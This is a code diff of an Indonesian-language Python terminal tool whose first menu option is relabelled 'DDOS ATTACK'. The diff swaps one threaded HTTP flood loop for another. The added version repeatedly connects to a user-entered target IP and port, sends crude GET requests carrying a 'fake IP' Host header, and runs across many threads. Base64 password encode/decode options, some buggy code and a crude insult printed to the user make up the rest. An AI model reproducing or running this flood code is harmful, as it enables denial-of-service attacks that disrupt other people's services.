@@ -67,7 +67,7 @@ def main():
     print(f"{KUNING} WARNING {x} {putih}Pastikan pilihan anda benar!{x}")
     i_user_1 = input(f"{putih} Masukan pilihan anda dengan benar : {x}")
 
-    #=================> bagian get cookies facebook <=================#
+    #=================> bagian DDOS ATTACK <=================#
     if i_user_1 == "1":
         time.sleep(00.03)
         os.system("clear")
@@ -75,52 +75,32 @@ def main():
         print(f"{KUNING} Pastikan Pengetesan di lakukan dengan ijin! {putih}(ADIYDDOS){x}")
         print(f"{putih}GASSS <=|==========> {x}")
 
-        # gass ddos 
-        try:
-            print(f" {abang}[!] {x}{biru} Harap masukan url tanpa ('https://')")
-            url = str(input(f"{abang}Masukan url target : {HIJAU}"))
-            port = input(f"{abang} Masukan port yang ingin di tuju : {HIJAU}")
-            durasi = int(input(f"{putih} Masukan seberapa lama anda ingin ddos :"))
-            ip2 = input(f"{putih}Masukan ip anda agar gak keditek :{HIJAU} ")
-            print(f"{x}")
+        # DDOS
+        url = str(input("Masukan IP Target: "))
+        Port = int(input("Masukan port: "))
+        trd = int(input("Masukan waktu serangan: "))
+        anonimous = str(input("Masukan face Ip: "))
 
-            try:
-                IP = socket.gethostbyname(url)
-                print(f"{abang}Url target adalah : {HIJAU}https://{url}")
-                print(f"{abang}ip target nya adalah : {HIJAU}{IP}")
-            
-            # interaksi 
-            except socket.gaierror:
-                print(f"{x} Url tidak valid url: https://{url} IP: {IP}")
+        def gas():
+            while True:
+                try:
+                    sok = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sok.connect((url, Port))
+                    sok.sendto(("GET /" + url + "HTTP/1.1\r\n").encode('ascii'), (url, Port))
+                    sok.sendto(("Host: " + anonimous + "\r\n\r\n").encode('ascii'), (url, Port))
+                except Exception as t:
+                    print(f"Error condition: {t}")
+                    # mengulang
+                    time.sleep(10) # waktu 10 detik 
+                    print(f"{putih} Terminal akan siap dalam waktu 10 detik{x}")
+                    os.system("clear")
+                    main()
+                
+        for j in range(trd):
+            tr = threading.Thread(target=gas)
+            tr.start()
+            # clouse ddos
 
-            # batasan treas
-            max = 9999
-            gas = threading.Semaphore(max)
-
-            def ddos():
-                while True:
-                    try:
-                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        s.connect((IP, port))
-                        s.sendto(("GET /:" + IP + "HTTP/1.1\r\n").encode('ascii'), (IP, port))
-                        s.sendto(("Host: " + ip2 + "\r\n\r\n").encode('ascii'), (IP, port))
-                        s.close()
-                    # berhentikan
-                    except Exception as e:
-                        print(f"Error: {e}")
-                        time.sleep(10)
-                        os.system("clear")
-            for i in range(durasi):
-                thr = threading.Thread(target=main)
-                thr.start()
-
-                waktu(320)
-
-        except:
-            print(f"Error periksa lagi waktu \r{waktu(10)}")
-            
-
-             
     #=================> bagian encode <=================#
     elif i_user_1 == "2":
         print(f"{KUNING} Warning : {x} {putih} Password bersifat privasi jadi ingat dengan benar!")
@@ -138,11 +118,70 @@ def main():
 
         print(f"{HIJAU} Password berhasil di encode : {x} \n ", di_encode)
 
+    #=================> bagian Dicode <=================# 
+    if i_user_1 == "3":
+        print(f"{KUNING} Warning : {x} {putih} Hasil encode yang di berikan harus benar dan tanpa ketinggalan 1 huruf")
+        print(f"{putih} Silahkan masukan password yang ingin anda decode {x}")
+        print(f"{KUNING} Harus bersifat string{x}")
+
+        decode = str(input(f"{putih} Masukan hasil Encode anda: "))
+
+        try:
+            di_decode = base64.b64decode(decode, validate=True)
+
+            try:
+                decode_str = di_decode.decode('utf-8') # memeriksa utf-8
+                print(f"{HIJAU} Password berhasil di decode: {x}{putih}", decode_str)
+                print(f"{putih} Pilih salah satu jika ingin lanjut (y/n){x}")
+                i_user_2 = input(f"{putih} Masukan pilihan anda: ")
+
+                if i_user_2.lower == "y":
+                    os.system("clear")
+                    print(f"{putih} proses clear terminal {x} \r{waktu(10)}detik")
+                    os.system("clear")
+                    print(f"{UNGU} Good luck!!")
+                    time.sleep(3) # jeda 3 detik
+                    main()
+                else:
+                    os.system("clear")
+                    print(f"{abang} Dua tia tutup botol{x}")
+                    time.sleep(5)
+                    # kondisi 2
+                    os.system("clear")
+                    print(f"{putih} Muka lu kek kontol")
+                    time.sleep(8) # kasih kisaran waktu 8 sec
+                    os.system("clear")
+
+            except UnicodeTranslateError:
+                print(f"{abang} Data yang ingin di encode salah! atau data bersifat number")
+                with open("encode_adi_ganteng.bin", "wb") as file:
+                    file.write(di_decode)
+                print(f"{putih} Data bin telah di simpan sebagai encode_adi_ganteng.bin")
+                print(f"{putih} System akan kembali dalam waktu {waktu(10)}sec")
+                main()
+        except binascii.Error:
+            print(f"{abang} [!]{x}{putih} Wrong input{x}")
+        except Exception as j:
+            print(f"Error: {j}")
+            time.sleep(5)
+            main()
+    #=================> bagian Encode-file <=================# 
+    if i_user_1 == "4":
+        print(f"{putih} Welcome to adiy script encode")
+        print(f"{KUNING}[!] WARNING {x} {putih}Dilarang keras encode script orang{x}")
+        print(f"{putih} Pastikan script sudah berada di folder {kuning}'encode'{x}")
+        
+        f_encode = str(input(f"{putih} Masukan nama file yang mau di encode: "))
+
+
+
+    
 
     else:
         os.system("clear")
         print(f"{abang} Pilihan tidak ada / tidak valid !{x}")
         print(f"{time.sleep(3)}{main()}")
+    
 
 
 if __name__ == "__main__":
